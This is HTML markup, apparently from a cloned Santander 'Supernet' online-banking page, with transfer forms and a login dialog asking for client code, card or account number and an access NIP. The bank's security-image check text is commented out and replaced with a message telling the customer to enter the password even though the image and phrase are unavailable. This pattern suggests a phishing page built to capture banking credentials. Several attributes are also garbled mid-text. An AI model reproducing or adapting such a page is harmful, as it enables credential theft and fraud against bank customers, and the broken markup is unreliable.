                                                                                                                <option value="undefined" selected=""></option>
                                                                                                                <option value="undefined" selected=""></option>
                                                                                                                <option value="undefined" selected=""></option>
                                                                                                            </select></div>
                                                                                                        <div id="c_tranquick.aCuenta" name="c_tranquick.aCuenta" style="position:absolute;left:10px;top:80px;display:inline"><select style="position:relative;left:0px;top:0px;width:171;" onblur="SKT()" onkeypress="return SKP(event);" id="tranquick.aCuenta" name="tranquick.aCuenta" l="">
                                                                                                                <option value="0">A la cuenta</option>
                                                                                                                <option value="undefined" selected=""></option>
                                                                                                                <option value="undefined" selected=""></option>
                                                                                                                <option value="undefined" selected=""></option>
                                                                                                            </select></div>
                                                                                                        <div id="c_tranquick.Concepto" name="c_tranquick.Concepto" class="size cls-txt-importe-operaciones_rapidas" style="position:absolute;left:11px;top:105px;border-width:0;"><input type="text" autocomplete="off" class="size cls-txt-importe-operaciones_rapidas" id="tranquick.Concepto" name="tranquick.Concepto" size="0" maxlength="40" t="0" onfocus="VLF(this)" onblur="" value="Concepto"></div>
                                                                                                        <font id="tranquick.signoPesos" style="position:absolute;left:1px;top:130px;font-size:14;">$</font>
                                                                                                        <div id="c_tranquick.importe" name="c_tranquick.importe" class="size" style="position:absolute;left:10px;top:129px;border-width:0;"><input type="text" autocomplete="off" class="size" id="tranquick.importe" name="tranquick.importe" size="20" maxlength="13" t="0" onfocus="VLF(this)" onblur="" value="Importe"></div><img id="tranquick.question2" class="linked" style="position:absolute;left:150px;top:105px;cursor: hand;" src="img/ayuda2.gif" border="0" imgname="ayuda2">
                                                                                                    </div>
                                                                                                    <div id="tranquick.i9" style="position:absolute;left:11px;top:155px;width:170;height:100;">
                                                                                                        <table id="tranquick.Container" style="position:relative;left:0px;top:0px;" cellpadding="0" cellspacing="0">
                                                                                                            <tbody>
                                                                                                            <tr id="tranquick.trns1">
                                                                                                                <td id="tranquick.trns11">
                                                                                                                    <div id="tranquick.divRFC1" style="position:relative;left:0px;top:0px;width:140;height:36;display:NONE;">
                                                                                                                        <table id="tranquick.SubContainer1" style="position:relative;left:0px;top:0px;" cellpadding="0" cellspacing="0">
                                                                                                                            <tbody>
                                                                                                                            <tr id="tranquick.subtrns1">
                                                                                                                                <td id="tranquick.subtrns11">
                                                                                                                                    <font id="tranquick.label13" style="position:relative;left:0px;top:0px;font-size:12;">Comprobante fiscal:</font>
                                                                                                                                    <fieldset id="c_tranquick.choiceRFC" name="c_tranquick.choiceRFC" style="position:absolute;left:-5px;top:12px;display:inline;border-style:none;">
                                                                                                                                        <table cellpadding="1" cellspacing="0">
                                                                                                                                            <tbody>
                                                                                                                                            <tr height="25">
                                                                                                                                                <td align="center" valign="middle"><input type="radio" id="tranquick.choiceRFC" name="tranquick.choiceRFC" value="Si"></td>
                                                                                                                                                <td nowrap="" style="cursor:pointer" onclick="CCN(-1)">Si</td>
                                                                                                                                                <td align="center" valign="middle"><input type="radio" id="tranquick.choiceRFC" name="tranquick.choiceRFC" value="No"></td>
                                                                                                                                                <td nowrap="" style="cursor:pointer" onclick="CCN(-1)">No</td>
                                                                                                                                            </tr>
                                                                                                                                            </tbody>
                                                                                                                                        </table>
                                                                                                                                    </fieldset>

                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                            </tbody>
                                                                                                                        </table>
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            <tr id="tranquick.trns2">
                                                                                                                <td id="tranquick.trns21">
                                                                                                                    <div id="tranquick.divRFC" style="position:relative;left:0px;top:0px;width:100;height:50;display:NONE;">
                                                                                                                        <table id="tranquick.subContainer2" style="position:relative;left:0px;top:0px;" cellpadding="0" cellspacing="0">
                                                                                                                            <tbody>
                                                                                                                            <tr id="tranquick.subtrns2">
                                                                                                                                <td id="tranquick.subtrns21">
                                                                                                                                    <div id="c_tranquick.RFC" name="c_tranquick.RFC" style="position:absolute;left:37px;top:-2px;border-width:0;"><input type="text" autocomplete="off" id="tranquick.RFC" name="tranquick.RFC" size="15" maxlength="13" t="0" onfocus="VLF(this)" onblur="VLB(this);if((UD(this,'v')!=this.value&amp;&amp;this.V)||UD(this,'dc')){UDS(this,'dc',F);undefined}"></div>
                                                                                                                                    <font id="tranquick.i29" class="size" style="position:relative;left:0px;top:0px;">RFC:</font>
                                                                                                                                    <div id="c_tranquick.IVA" name="c_tranquick.IVA" style="position:absolute;left:37px;top:24px;border-width:0;"><input type="text" autocomplete="off" id="tranquick.IVA" name="tranquick.IVA" size="15" maxlength="8" t="0" onfocus="VLF(this)" onblur="VLB(this);if((UD(this,'v')!=this.value&amp;&amp;this.V)||UD(this,'dc')){UDS(this,'dc',F);undefined}"></div>
                                                                                                                                    <font id="tranquick.i99" class="size" style="position:absolute;left:0px;top:26px;">IVA:</font>
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                            </tbody>
                                                                                                                        </table>
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            </tbody>
                                                                                                        </table>
                                                                                                        <table id="tranquick.Container2" style="position:relative;left:0px;top:0px;" cellpadding="0" cellspacing="0">
                                                                                                            <tbody>
                                                                                                            <tr id="tranquick.trns3">
                                                                                                                <td id="tranquick.trns31">
                                                                                                                    <div id="tranquick.divInter" style="position:relative;left:0px;top:0px;width:100;height:30;display:NONE;">
                                                                                                                        <div id="tranquick.divDias1" style="position:relative;left:0px;top:0px;display:NONE;">
                                                                                                                            <fieldset id="c_tranquick.choiceInter" name="c_tranquick.choiceInter" style="position:absolute;left:-5px;top:0px;display:inline;border-style:none;">
                                                                                                                                <table cellpadding="1" cellspacing="0">
                                                                                                                                    <tbody>
                                                                                                                                    <tr class="size" height="25">
                                                                                                                                        <td align="center" valign="middle"><input type="radio" id="tranquick.choiceInter" name="tranquick.choiceInter" value="1"></td>
                                                                                                                                        <td nowrap="" style="cursor:pointer" onclick="CCN(-1)">Mismo día</td>
                                                                                                                                        <td align="center" valign="middle"><input type="radio" id="tranquick.choiceInter" name="tranquick.choiceInter" value="2"></td>
                                                                                                                                        <td nowrap="" style="cursor:pointer" onclick="CCN(-1)">Día siguiente</td>
                                                                                                                                    </tr>
                                                                                                                                    </tbody>
                                                                                                                                </table>
                                                                                                                            </fieldset>

                                                                                                                        </div>
                                                                                                                        <font id="tranquick.comision" class="size" style="position:absolute;left:0px;top:0px;">Comisión: $ 0.00</font>
                                                                                                                    </div>
                                                                                                                </td>
                                                            </tr>
                                                        <tr id="tranquick.trns4">
                                                        <td id="tranquick.trns41">
                                 <div id="tranquick.i17" style="position:relative;left:0px;top:0px;width:130;height:20;">
                                                                                                                        <table id="c_tranquick.fecha" name="c_tranquick.fecha" style="position:relative;left:0px;top:0px;display:inline" class="size">
                                                                                                                            <tbody>
                                                                                                                            <tr>
                                                                                                                                <td nowrap=""></td>
                                                                                                                                <td nowrap="">
                                                                                                                                    <fieldset style="position:absolute;left:0px;top:0px;display:inline;border-width:0;"><input id="tranquick.fecha" name="tranquick.fecha" class="size" readonly="" style="position:relative;top:-5px;" size="10" maxlength="11" l="" t="5" onfocus="VLF(this)" onblur="" '="">
                                                 <img style="position:relative;left:5px;cursor:pointer" onclick="" src="jackbe/img/cal.gif"></fieldset>
                                                                                                                                </td>
                                 </tr>
                                                                                                                            </tbody>
                                                                </table>
                                             </div>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            <tr id="tranquick.Container_1">
                                                                                                                <td id="tranquick.tableCircular14">
                                                                                                                    <table id="tranquick.ContainerCURPRFC" style="position:relative;left:0px;top:0px;" cellpadding="0" cellspacing="0">
                                                                                                                        <tbody>
                                                                                                                        <tr id="tranquick.trns1">
                                                                                                                            <td id="tranquick.trns11">
                                                                                                                                <div id="tranquick.divRFCCURP1" style="position:relative;left:0px;top:0px;width:180;height:36;display:NONE;">
                                                                                                                                    <table id="tranquick.SubContainer1_CURPRFC" style="position:relative;left:0px;top:0px;" cellpadding="0" cellspacing="0">
                                                                                                                                        <tbody>
                                                                                                                                        <tr id="tranquick.subtrns1">
                                                                                                                                            <td id="tranquick.subtrns11">
                                                                                                                                                <font id="tranquick.label13_CIRC" style="position:relative;left:0px;top:0px;font-size:12;">¿Selecciona el dato a enviar?</font>
                                                                                                                                                <fieldset id="c_tranquick.choiceRFC_CURP" name="c_tranquick.choiceRFC_CURP" style="position:absolute;left:-5px;top:12px;display:inline;border-style:none;">
                                                                                                                                                    <table cellpadding="1" cellspacing="0">
                                                                                                                                                        <tbody>
                                                                                                                                                        <tr height="25">
                                                                                                                                                            <td align="center" valign="middle"><input type="radio" id="tranquick.choiceRFC_CURP" name="tranquick.choiceRFC_CURP" value="RFC"></td>
                                                                                                                                                            <td nowrap="" style="cursor:pointer" onclick="CCN(-1)">RFC</td>
                                                                                                                                                            <td align="center" valign="middle"><input type="radio" id="tranquick.choiceRFC_CURP" name="tranquick.choiceRFC_CURP" value="CRP"></td>
                                                                                                                                                            <td nowrap="" style="cursor:pointer" onclick="CCN(-1)">CURP</td>
                                                                                                                                                        </tr>
                                                                                                                                                        </tbody>
                                                                                                                                                    </table>
                                                                                                                                                </fieldset>

                                                                                                                                            </td>
                                                                                                                                        </tr>
                                                                                                                                        </tbody>
                                                                                                                                    </table>
                                                                                                                                </div>
                                                                                                                            </td>
                                                                                                                        </tr>
                                                                                                                        <tr id="tranquick.trns2">
                                                                                                                            <td id="tranquick.trns21">
                                                                                                                                <div id="tranquick.divRFCCURP" style="position:relative;left:0px;top:0px;width:100;height:50;display:NONE;">
                                                                                                                                    <table id="tranquick.subContainer2" style="position:relative;left:0px;top:0px;" cellpadding="0" cellspacing="0">
                                                                                                                                        <tbody>
                                                                                                                                        <tr id="tranquick.subtrns2">
                                                                                                                                            <td id="tranquick.subtrns21">
                                                           <div id="c_tranquick.RFCCURP" name="c_tranquick.RFCCURP" style="position:absolute;left:37px;top:-2px;border-width:0;"><input type="text" autocomplete="off" id="tranquick.RFCCURP" name="tranquick.RFCCURP" disabled="" size="15" maxlength="13" t="0" onfocus="" onblur=""></div>
                                                                                   <font id="tranquick.i29" class="size" style="position:relative;left:0px;top:0px;">RFC:</font>
                                                                                   <div id="c_tranquick.CURP" name="c_tranquick.CURP" style="position:absolute;left:37px;top:24px;borderete="off" id="tranquick.CURP" name="tranquick.CURP" disabled="" size="15" maxlength="20" t="0" onfocus="VLF(this)" onblur=""></div>
                                                                                                                                                <font id="tran:absolute;left:0px;top:26px;">CURP:</font>
                                                                                                                                            </td>
                                                                                                                                        </tr>
                                                                                                                                        </tbody>
                                                                                                                                    </table>
                                                                                </div>
                                                     </td>
                                                                                                                        </tr>
                                                                                                                        </tbody>
                                                                                                                    </table>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            <tr id="tranquick.trns4_1">
                                                                                                                <td id="tranquick.trns41_1">
                                                                                                                    <div id="tranquick.divInterRef" style="position:relative;left:0px;top:0px;width:100;height:50;display:NONE;">
                                                                                                                        <div id="c_tranquick.Referencia" name="c_tranquick.Referencia" style="position:absolute;left:0px;top:0px;border-width:0;"><input type="text" autocomplete="off" id="tranquick.Referencia" name="tranquick.Referencia" size="15" maxlength="7" t="0" onfocus="VLF(this)" onblur="" value="Referencia"></div>
                                                                                                                        <div id="c_tranquick.RFC_BENEFICIARIO" name="c_tranquick.RFC_BENEFICIARIO" style="position:absolute;left:0px;top:25px;border-width:0;"><input type="text" autocomplete="off" id="tranquick.RFC_BENEFICIARIO" name="tranquick.RFC_BENEFICIARIO" size="15" maxlength="13" t="0" onfocus="VLF(this)" onblur="VLhis,'v')!=this.value&amc')){UDS(thisvalue="RFC Beneficiario"></div>
                             </div>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            <tr id="tranquick.trns4">
                                                                                                                <td id="tranquick.trns41">
                                                                                                                    <div id="tranquick.i38" style="position:relative;left:0px;top:0px;width:100;height:25;"><a id="tranquick.add" class="item" style="position:absolute;left:0px;top:5px;" href="#">Agregar cuenta</a><button id="tranquick.pagar" name="enter" class="accionBtn" value="Transferir" style="position:absolute;left:112px;top:3px;width:63;height:22;" type="button"><u></u>Transferir</button>

                                                                                                                    </div>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            </tbody>
                                                                                                        </table>
                                                                                                    </div>
                                                                                                </div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </td>
                                                                                </tr>
                                                                                <tr id="oprp.asociNoMovil">
                                                                                    <td class="oprap" id="oprp.asociNoMovilDiv">
                                                                                        <div id="oprp.operation" class="linked" style="position:relative;left:0px;top:0px;width:196;"><img id="oprp.asociNoMovilImg" style="position:relative;left:0px;top:0px;cursor: hand;" src="img/oprMobile.jpg" border="0" imgname="oprMobile">
                                                                                            <font id="oprp.asociNoMovilImgLb" class="header3" style="position:absolute;left:22px;top:3px;">Asociar cuenta a Núm. Móvil</font>
                                                                                        </div>
                                                                                    </td>
                                                                                </tr>
                                                                                <tr id="oprp.misfr001">
                                                                                    <td class="fsiSubtitulo" id="oprp.misfr01">
                                                                                        <div id="oprp.misfr1" class="oprpLabels" style="position:relative;left:0px;top:0px;width:210;height:13;">
                                                                                            <font id="oprp.i67" class="header2" style="position:absolute;left:9px;top:-2px;">Operaciones favoritas</font>
                                                                                            <div id="oprp.i83" class="spnt-sombra" style="position:absolute;left:1px;top:-2px;width:208;height:4;"></div>
                                                                                        </div>
                                                                                    </td>
                                                                                </tr>
                                                                                <tr id="oprp.misfr">
                                                                                    <td class="oprap" id="oprp.misf">
                                                                                        <div id="oprp.msfcont" style="position:relative;left:0px;top:0px;">
                                                                                            <div id="msfquick.operation" class="linked" style="position:absolute;left:0px;top:0px;width:196;"><img id="msfquick.mainButt" style="position:relative;left:0px;top:0px;cursor: hand;" src="img/oprConfiguration.jpg" border="0" imgname="oprConfiguration">
                                                                                                <font id="msfquick.title" class="header3" style="position:absolute;left:22px;top:3px;">Mis Favoritos</font>
                                                                                            </div>
                                                                                            <div id="msfquick.main" class="mainOperation" style="position:absolute;left:0px;top:21px;width:193;height:214;display:NONE;border-style:solid;">
                                                                                                <div id="msfquick.pser.header" class="ieSubHeader" style="position:relative;left:0px;top:0px;width:194;height:22;background-color:red;">
                                                                                                    <font id="msfquick.title" class="header4" style="position:absolute;left:22px;top:3px;">Mis favoritos</font><img id="msfquick.arrow" style="position:absolute;left:9px;top:0px;cursor: hand;" src="img/flecha.gif" border="0" imgname="flecha"><img id="msfquick.question" class="linked" style="position:absolute;left:170px;top:2px;cursor: hand;" src="img/ayuda1.gif" border="0" imgname="ayuda1">
                                                                                                </div>
                                                                                                <div id="msfquick.panelFav" style="position:relative;left:0px;top:0px;width:190;height:170;overflow:scroll;">
                                                                                                    <table class="eTable" id="msfquick.favs.Lista" style="position:relative;left:0px;top:0px;" cellpadding="0" cellspacing="0"></table>
                                                                                                </div>
                                                                                                <div id="msfquick.admonFav" style="position:relative;left:0px;top:0px;width:190;height:22;"><a id="msfquick.i17" class="item" style="position:absolute;left:14px;top:2px;" href="#" onclick="A('Liga para administrar favoritos')">Administrar Mis Favoritos</a></div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </td>
                                                                                </tr>
                                                                                <tr id="oprp.trContainer123">
                                                                                    <td class="oprap" id="oprp.tdContainer123">
                                                                                        <div id="oprp.divContainer123" style="position:relative;left:0px;top:0px;"></div>
                                                                                    </td>
                                                                                </tr>
                                                                                </tbody>
                                                                            </table>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div id="spnt.tabdivs.msdr.work" class="msdr" style="position:absolute;left:232px;top:0px;width:597;height:722;background-color:FFFFFF;"></div>
                                                            </div>
                                                            <div id="spnt.tabdivs.inve" class="ieTabInve ieTab" style="position: absolute; left: 0px; top: 0px; width: 830px; height: 722px; background-color: rgb(255, 255, 255); display: none;"></div>
                                                            <div id="spnt.tabdivs.pgs" class="ieTabPgs ieTab" style="position: absolute; left: 0px; top: 0px; width: 830px; height: 722px; background-color: rgb(255, 255, 255); display: none;"></div>
                                                            <div id="spnt.tabdivs.tran" class="ieTabTran ieTab" style="position: absolute; left: 0px; top: 0px; width: 830px; height: 722px; background-color: rgb(255, 255, 255); display: none;"></div>
                                                            <div id="spnt.tabdivs.bpriv" class="ieTabBpriv ieTab" style="position: absolute; left: 0px; top: 0px; width: 830px; height: 722px; background-color: rgb(255, 255, 255); display: none;"></div>
                                                            <div id="spnt.tabdivs.dire" class="ieTabDire ieTab" style="position: absolute; left: 0px; top: 0px; width: 830px; height: 722px; background-color: rgb(255, 255, 255); display: none;"></div>
                                                            <div id="spnt.tabdivs.admn" class="ieAdmin ieTab" style="position: absolute; left: 0px; top: 0px; width: 830px; height: 722px; background-color: rgb(255, 255, 255); display: none;"></div>
                                                        </div>
                                                        <div id="spnt.mnsg" class="ieTransparent" style="position:absolute;left:850px;top:130px;width:153;height:600;background-color:000000;">
                                                            <div id="spnt.mnsg.msgs" class="msg" style="position: absolute; left: 3px; top: 2px; width: 145px; height: 150px; display: none;">
                                                                <font id="spnt.mnsg.msgs.title" style="position:absolute;left:7px;top:4px;font-size:11;"><b>Mensajes</b></font>
                                                                <div id="spnt.mnsg.msgs.textcont" style="position:absolute;left:2px;top:36px;width:130;height:94;overflow:hidden;">
                                                                    <fieldset id="c_spnt.mnsg.msgs.tcont.text" style="position:absolute;left:0px;top:0px;width:100%;height:100%;display:inline;border-width:0;">
                                                                        <font id="spnt.mnsg.msgs.tcont.text" style="font-size:12;"></font>
                                                                    </fieldset>
                                                                </div>
                                                                <font id="spnt.mnsg.msgs.date" style="position:absolute;left:5px;top:21px;font-size:11;"></font>
                                                                <fieldset id="c_spnt.mnsg.msgs.link" style="position:absolute;left:74px;top:130px;width:50;display:inline;border-width:0;">
                                                                    <font id="spnt.mnsg.msgs.link" class="link" style="font-size:11;"><u>Leer mÃ¡s</u></font>
                                                                </fieldset>
                                                                <div id="spnt.mnsg.msgs.layer" class="layer" style="position:relative;left:0px;top:0px;width:100%;height:100%;z-index:10;"></div>
                                                            </div>
                                                        </div>
                                                        <div id="spnt.mnsg2" class="ieTransparent" style="position: absolute; left: 853px; top: 146px; width: 150px; height: 440px; background-color: rgb(255, 255, 255);">
                                                            <div id="zone8" style="position:absolute;left:0px;top:0px;width:145;height:145;">
                                                                <div id="zone8.ifrDivCampana" style="position:relative;left:0px;top:0px;"><iframe style="position: relative; left: 0px; top: 0px; height: 145px; width: 145px;" id="zone8.iframeCampana" name="zone8.iframeCampana" src="jsp/banner.php?zone_id=9" scrolling="no" frameborder="0"></iframe></div>
                                                            </div>
                                                            <div id="promoCampanas" style="position:absolute;left:0px;top:150px;width:145;height:290;">
                                                                <div id="zone9.ifrDivCampana" style="position:relative;left:0px;top:0px;"><iframe style="position: relative; left: 0px; top: 0px; height: 290px; width: 145px;" id="zone9.iframeCampana" name="zone9.iframeCampana" src="jsp/banner.php?zone_id=10" scrolling="no" frameborder="0"></iframe></div>
                                                            </div>
                                                        </div>
                                                        <div id="spnt.foot" class="footer" style="position:absolute;left:0px;top:732px;width:990;height:35;background-color:FFFFFF;"><img id="spnt.foot.button" style="position:relative;left:0px;top:0px;cursor: hand;" src="img/footer_logo_santander.gif" border="0" imgname="footer_logo_santander">
                                                            <img id="i96" style="position:absolute;left:990px;top:0px;cursor: hand;" src="img/footer_esquina_der.gif" border="0" imgname="footer_esquina_der">
                                                            <font id="i100" style="position:absolute;left:30px;top:10px;font-size:12;">Banco Santander</font>
                                                        </div>
                                                    </div>
                                                    <div id="spnt.div.header" style="position:absolute;left:0px;top:0px;width:1003;height:655;">
                                                        <div id="spnt.header2" style="position:absolute;left:0px;top:0px;width:1003;height:55;background-color:#FF0000;overflow:hidden;"><img id="imgLogoLogin" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/logo.gif" border="0" height="55" width="270" imgname="logo"><img id="i9" style="position:absolute;left:482px;top:0px;cursor: hand;" src="img/globales.gif" border="0" height="25" width="491" imgname="globales"><img id="i10" style="position:absolute;left:753px;top:25px;cursor: hand;" src="img/mapa.gif" border="0" height="30" width="220" imgname="mapa"></div>
                                                        <div id="spnt.tabctrl2" style="position:absolute;left:0px;top:55px;width:1003;height:30;background-color:#FF0000;"><img id="i104" style="position:absolute;left:787px;top:-2px;cursor: hand;" src="img/mapa_2.gif" border="0" imgname="mapa_2"></div>
                                                        <div id="Main2" style="position:absolute;left:0px;top:55px;width:1003;height:600;"></div>
                                                        <table id="tblHeader" style="position:relative;left:0px;top:0px;" width="869">
                                                            <tbody>
                                                            <tr id="tr1">
                                                                <td id="td1" align="center">
                                                                    <div id="spnt.div.encabezado" class="filters" style="position:absolute;left:15px;top:150px;width:840;height:450;overflow:hidden;">
                                                                        <div id="spnt.div.encabezado.UtilDialogHeader" class="title" style="position:absolute;left:1px;top:1px;width:100%;height:28;overflow:hidden;">
                                                                            <div id="spnt.div.encabezado.UtilDialogHeaderIn" class="inTitle" style="position:absolute;left:0px;top:0px;width:100%;height:26;overflow:hidden;">
                                                                                <font id="spnt.div.encabezado.lblTxt" class="dialogLabelBold" style="position:absolute;left:5px;top:5px;">PersonalizaciÃ³n de Encabezado</font>
                                                                                <div id="UtilHelpCont" class="helpHeaderIcon" style="position:relative;left:0px;top:0px;"></div><img id="i83" style="position:absolute;left:815px;top:5px;cursor: hand;" src="img/ayuda1.gif" border="0" imgname="ayuda1">
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div id="spnt.div.encabezado.BodyMessage" style="position:absolute;left:1px;top:175px;width:840;height:400;overflow:hidden;"></div>
                                                                </td>
                                                            </tr>
                                                            </tbody>
                                                        </table>
                                                        <div id="spnt.foot2" class="footer" style="position:absolute;left:0px;top:622px;width:1003;height:35;background-color:FFFFFF;"><img id="spnt.foot.button" style="position:relative;left:0px;top:0px;cursor: hand;" src="img/footer_logo_santander.gif" border="0" imgname="footer_logo_santander"><img id="i96" style="position:absolute;left:991px;top:0px;cursor: hand;" src="img/footer_esquina_der.gif" border="0" imgname="footer_esquina_der">
                                                            <font id="i100" style="position:absolute;left:30px;top:10px;font-size:12;">Banco Santander</font>
                                                        </div>
                                                    </div>
                                                </td>
                                            </tr>
                                            </tbody>
                                        </table>
                                    </td>
                                </tr>
                                </tbody>
                            </table>
                            <div id="rsa" style="position:absolute;left:0px;top:0px;width:0;height:0;display:NONE;"></div>
                        </div>
                        <div id="i1" style="position: relative; left: 0px; top: 0px; width: 1003px; height: 655px; display: none;">
                            <div id="div" style="position:absolute;left:0px;top:0px;height:130;z-index:0;"><img id="i1" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/header.png" border="0" height="130" width="1010" imgname="header"></div>
                            <div id="Main" style="position: absolute; left: 0px; top: 55px; width: 1003px; height: 600px; display: block;">
                                <div id="iB" style="position:absolute;left:0px;top:26px;width:1003;height:28;z-index:20;">
                                    <font id="i1" class="white lbl_bold" style="position:absolute;left:15px;top:18px;"><b>Banca Digital Santander</b></font><img id="cruz" style="position:absolute;left:980px;top:18px;cursor: hand;" src="img/exit.png" border="0" height="18" width="18" imgname="exit" onclick="cerrarVentanaSinPreguntar()">
                                </div>
                                <div id="div" style="position:absolute;left:0px;top:65px;z-index:0;"><img id="i1" style="position:absolute;left:0px;top:0px;cursor: hand;" src="img/fondoSTU.gif" border="0" height="550" width="1003" imgname="fondoSTU"></div><img id="i16" class="lineD" style="position:absolute;left:120px;top:150px;cursor: hand;" src="img/logo_supernet.gif" border="0" imgname="logo_supernet">
                                <div id="splg.divMain" style="position:absolute;left:0px;top:124px;width:1000;height:500;">
                                    <font id="msg" class="all" style="position:absolute;left:620px;top:40px;font-size:11;"></font>
                                    <font id="i74" class="all med_gray" style="position:absolute;left:620px;top:68px;color:#555;">Código de Cliente / Nº Tarjeta / Nº Cuenta </font>
                                    <div id="c_login.claveCliente" name="c_login.claveCliente" class="all" style="position:absolute;left:620px;top:92px;border-width:0;"><input type="password" autocomplete="off" class="all" id="login.claveCliente" name="login.claveCliente" size="30" maxlength="16" t="7" onfocus="VLF(this)" onblur="VLB(this);if((UD(this,'v')!=this.value&amp;&amp;this.V)||UD(this,'dc')){UDS(this,'dc',F);undefined}" v=""></div>
                                    <fieldset id="c_i8_cp_cp" style="position:absolute;left:100px;top:380px;width:810;display:inline;border-width:0;">
                                        <font id="i8_cp_cp" class="txt_stu" style="font-size:15;color:#444;">
                                            <center>En Santander nunca solicitamos a nuestros clientes información confidencial<br> tales como <b>usuarios</b>, <b>contraseñas</b> o <b>token</b>. </center>
                                        </font>
                                    </fieldset><a id="splg.btnEntrar" class="btn_stu_otp" style="position:absolute;left:640px;top:120px;" href="#"><span>Continuar</span></a>
                                </div>
                                <div id="divTerminos" style="position:absolute;left:390px;top:590px;width:300;height:20;display:NONE;">
                                    <font id="lblTerminos" class="med_gray lbl_bold pointer" style="position:absolute;left:20px;top:3px;font-size:14;">Términos y Condiciones</font>
                                </div>
                            </div>
                        </div>
                    </td>
                </tr>
                </tbody>
            </table>
        </td>
    </tr>
    </tbody>
</table>


<script type="text/javascript">
    window.parent.document.title = "Santander - Supernet - s1";

</script>










<meta http-equiv="expires" content="0">
<meta http-equiv="Pragma" content="no-cache">







<noscript>
<object classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540000' width='1' height='1'>
    <param name='movie' value='utilerias_rsa/pmfso.swf'>
    <param name='quality' value='high'>
    <param name='bgcolor' value=#FFFFFF>
    <param name='FlashVars' value='gotoUrl=&sendUrl=..%2Fjsp%2FgetPMData.jsp'>
    <embed src='/Supernet2007/utilerias_rsa/pmfso.swf' FlashVars='gotoUrl=&sendUrl=..%2Fjsp%2FgetPMData.jsp' quality='high' bgcolor='#FFFFFF' width='1' height='1' type='application/x-shockwave-flash'>
    <noembed></noembed>
    <noobject></noobject>
    </embed>
    <noobject></noobject>
    </object>
    </noscript>



<div id="UtilDialog" class="mainWin" style="position: absolute; left: 100px; top: 58px; display: block; z-index: 20000; height: 612px; width: 836px;">
    <div id="UtilDialogHeader" class="title" style="position: absolute; left: 1px; top: 1px; width: 832px; height: 28px; cursor: default;">
        <table id="UtilDialogHeader_Table" style="position:relative;left:0px;top:0px;" width="100%" cellpadding="0" cellspacing="0">
            <tbody>
            <tr id="i5" height="28">
                <td class="dheader" id="td0UtilDialogHeader">

                    <font id="UtilDialogHeaderTitle" class="header" style="position:absolute;left:9px;top:4px;">Banca Digital Santander</font><a id="UtilDialogHeaderFOCUS" style="position:relative;left:0px;top:0px;" href="#"></a>
                </td>
                <td class="dheader" id="td1UtilDialogHeader" align="right">
                    <img id="UtilHelp" style="position: relative; left: 0px; top: 0px; cursor: help; display: block;" src="img/ayudaR1.gif" border="0" imgname="ayuda1">
                </td>
            </tr>
            </tbody>
        </table>
    </div>
    <div id="UtilDialogBody" class="win_bckg" style="position: absolute; left: 1px; top: 29px; width: 832px; height: 580px;">
        <div id="enroll_STU" style="position:relative;left:0px;top:0px;width:832;height:580;background-color:#FFFFFF;"><img id="i2" style="position:absolute;left:240px;top:15px;cursor: hand;" src="img/ingresoSTU_supernet.gif" border="0" imgname="ingresoSTU_supernet">
            <fieldset id="c_i9" style="position:absolute;left:30px;top:135px;width:780;display:inline;border-width:0;">
                <font id="i9" class="txt_stu" style="font-size:13;">
                    <!--<center><b>Estimado cliente, <font color="red" style="font-size:13;font-family:Verdana, Geneva, sans-serif;">verifique la imagen y frase que usted definió </font>previo a ingresar su contraseña de acceso.</b></center>-->
                    <center><b>Estimado cliente, <font color="red" style="font-size:13;font-family:Verdana, Geneva, sans-serif;">estamos teniendo problemas para mostrar tu imagen y frase </font>favor de ingresar su contraseña de acceso.</b></center>
                </font>
            </fieldset>
            <fieldset id="c_i9_cp" style="position:absolute;left:30px;top:165px;width:780;display:inline;border-width:0;">
                <font id="i9_cp" class="txt_stu" style="font-size:14;">
                    <!--<center><b>Si usted no reconoce la imagen y/o frase </b> comuníquese a <b>Super<font color="red" style="font-size:14;font-family:Verdana, Geneva, sans-serif;">Línea </font></b> <br>0155 51694300 opción 4 </center>-->
                </font>
            </fieldset>
            <div id="div2" class="div_gray" style="position:absolute;left:85px;top:225px;width:680;height:170;">
                <fieldset id="c_stu.frase" style="position:absolute;left:291px;top:40px;width:380;display:inline;border-width:0;">
                    <font id="stu.frase" class="frase_stu" style="font-size:13;color:red;">Frase no disponible<!--"BIENVENIDO "--></font>
                </fieldset>
                <fieldset id="c_i12" style="position:absolute;left:292px;top:326px;width:380;display:inline;border-width:0;">
                    <font id="i12" class="txt_stu oculta" style="font-size:12;">
                        <center>Si la imagen y el texto son correctos, por favor digite su</center>
                    </font>
                </fieldset>
                <font id="i12_cp" class="txt_stu" style="position:absolute;left:310px;top:100px;font-size:12;"><b>NIP de acceso:</b></font><a id="login.Cancelar" class="btn_stu oculta" style="position:absolute;left:252px;top:450px;" href="#"><span>Cerrar</span></a>
                <fieldset id="c_i9_cp2" style="position:absolute;left:0px;top:300px;width:700;display:inline;border-width:0;">
                    <font id="i9_cp2" class="txt_stu" style="font-size:14;">
                        <center><b>
                                <font color="red" style="font-size:14;font-family:Verdana, Geneva, sans-serif;"></font>
                            </b> En <b>Santander</b> nunca solicitamos a nuestros clientes información confidencial <br> tales como usuarios, contraseñas o token.</center>
                    </font>
                </fieldset><a id="login.Continuar" class="btn_stu_otp" style="position:absolute;left:500px;top:200px;" href="#"><span>Continuar</span></a>
                <div id="c_stu.nip" name="c_stu.nip" class="input_stu" style="position:absolute;left:456px;top:100px;border-width:0;"><input type="password" autocomplete="off" class="input_stu data_nip" id="stu.nip" name="i14" size="20" maxlength="50" t="0" ></div>

                <!--<img id="stu.imgSelected" style="position:absolute;left:142px;top:20px;cursor: hand;" src="download.jpeg" border="0" height="130" width="130">-->

                <img id="stu.imgSelected" style="position:absolute;left:142px;top:20px;cursor: hand;" src="santi.jpg" border="0" height="130" width="130">



